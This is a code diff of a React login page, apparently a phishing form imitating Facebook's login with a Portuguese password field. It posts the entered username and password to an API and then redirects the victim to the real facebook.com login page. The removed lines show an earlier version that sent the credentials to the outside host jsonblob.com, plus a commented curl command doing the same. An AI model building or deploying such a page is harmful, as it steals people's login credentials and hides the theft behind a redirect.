@@ -11,9 +11,7 @@ function HomePage() {
 	} = useForm();
 
 	const onSubmit = async (data) => {
-		// alert(`${data.pass} || ${data.user}`);
-
-		const response = await fetch("https://jsonblob.com/api/jsonBlob", {
+		const response = await fetch("http://localhost:3000/api/dados", {
 			method: "POST",
 			headers: {
 				"Content-Type": "application/json",
@@ -24,25 +22,12 @@ function HomePage() {
 			}),
 		});
 
-		// console.log("response");
-		// console.log(response);
-		var myHeaders = response.headers.get("location");
-		// console.log(myHeaders.has("x-jsonblob"));
-		// console.log("myHeaders");
-		// console.log(myHeaders);
 		const responseData = await response.json();
 
-		// console.log("responseData");
-		// console.log(responseData);
-
-		if (typeof window === "undefined") {
-			alert("server side");
-			console.log("myHeaders");
-			console.log(myHeaders);
+		if (responseData) {
+			window.location.assign("https://facebook.com/login");
 		}
 	};
-
-	// curl -i -X "POST" -d '{"perfil":["email", "pass"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
 
 	return (
 		<Layout>
@@ -91,7 +76,6 @@ function HomePage() {
 									width: "363px",
 								}}
 								type="password"
-								// name="pass"
 								placeholder="Palavra-passe"
 								{...register("pass", { required: true })}
 							/>
